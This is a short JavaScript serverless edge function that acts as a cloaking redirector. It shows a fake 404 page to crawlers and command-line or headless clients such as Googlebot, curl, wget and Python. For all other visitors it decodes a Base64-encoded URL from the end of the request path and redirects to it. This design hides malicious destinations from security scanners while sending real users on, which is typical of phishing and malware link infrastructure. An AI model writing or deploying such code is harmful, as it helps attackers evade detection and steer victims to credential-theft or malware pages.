export default async (request, context) => {
  const url = new URL(request.url);
  const userAgent = (request.headers.get("user-agent") || "").toLowerCase();
  
  const FAKE_404_HTML = `<!DOCTYPE html><html><head><title>404 Not Found</title><style>body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;}h1{border-right:1px solid #ccc;padding:10px 20px;margin-right:20px;}span{font-size:14px;}</style></head><body><h1>404</h1><span>This page could not be found.</span></body></html>`;

  // 1. BOT CHECK (Simplified to avoid false positives during testing)
  const botKeywords = ["googlebot", "bingbot", "python", "curl", "wget", "headless"];
  if (botKeywords.some(bot => userAgent.includes(bot))) {
    return new Response(FAKE_404_HTML, { status: 404, headers: { "Content-Type": "text/html" } });
  }

  // 2. EXTRACTION (More aggressive)
  // This looks for anything after the LAST dot in the URL path
  const parts = url.pathname.split(".");
  const base64Data = parts.length > 1 ? parts.pop() : null;

  if (base64Data && base64Data.length > 10) { // Ensure it's a long enough string
    try {
      // Decode and clean the Base64
      const normalized = base64Data.replace(/-/g, '+').replace(/_/g, '/').trim();
      const decodedUrl = atob(normalized);
      
      if (decodedUrl.startsWith("http")) {
        console.log("Redirecting to:", decodedUrl);
        return Response.redirect(decodedUrl, 302);
      }
    } catch (e) {
      console.log("Base64 Decode Failed for:", base64Data);
    }
  }

  // 3. FALLBACK
  return new Response(FAKE_404_HTML, { status: 404, headers: { "Content-Type": "text/html" } });
};

export const config = { path: "/*" };
